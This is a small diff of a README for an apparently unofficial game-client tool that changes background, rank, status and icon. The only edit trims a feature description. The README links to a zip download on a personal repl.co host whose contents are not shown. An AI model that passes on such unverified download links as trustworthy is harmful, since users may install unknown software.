@@ -2,7 +2,7 @@
 ## [Click Here](https://cdn.flowd1337.repl.co/download/irf-tool.zip) to Download
 
 # Features 🐍
-- Background Changer (any skin of the game)
+- Background Changer
 - Rank Changer (soloq, flex, 3x3, tft)
 - Status Changer (bypass character limit)
 - Icon Changer (chibi icons)
